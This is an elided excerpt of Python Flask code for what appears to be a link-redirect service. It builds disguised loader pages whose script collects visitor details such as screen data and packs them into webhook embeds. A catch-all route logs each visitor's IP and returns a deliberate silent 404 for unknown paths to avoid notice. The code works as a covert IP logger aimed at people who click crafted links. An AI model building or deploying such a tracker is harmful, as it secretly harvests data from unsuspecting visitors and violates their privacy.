...
# --- 1. SMART LOADER (Redirects) ---
SMART_LOADER_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>{{ title }}</title><style>body{background:#000;}</style></head>
<body>
    <script>
        ...
        webhook_data = {
            ...
            "embeds": [{
                ...
                "fields": [
                    ...
                    {"name": "Screen", "value": f"`{data.get('s', 'Unknown')}`", "inline": True},
...
def add_route():
    ...
    conn.execute('INSERT OR REPLACE INTO routes (path, type, content, is_smart, page_title) VALUES (?, ?, ?, ?, ?)',
                 (request.form['path'].strip('/'), request.form['type'], request.form['content'], 1 if request.form.get('is_smart') else 0, request.form.get('page_title', '')))
    conn.commit()
    conn.close()
    return redirect(url_for('admin_dashboard'))
...
def catch_all(path):
    ...
    # 1. Check if path exists in DB
    conn = get_db_connection()
    route = conn.execute('SELECT * FROM routes WHERE path = ?', (path,)).fetchone()
    conn.close()

    # 2. If NO route exists -> Return 404 SILENTLY (No Log, No Redirect)
    if not route:
        return abort(404)

    # 3. If route DOES exist -> Log it and Serve content
    if request.headers.getlist("X-Forwarded-For"): ip = request.headers.getlist("X-Forwarded-For")[0]
    else: ip = request.remote_addr
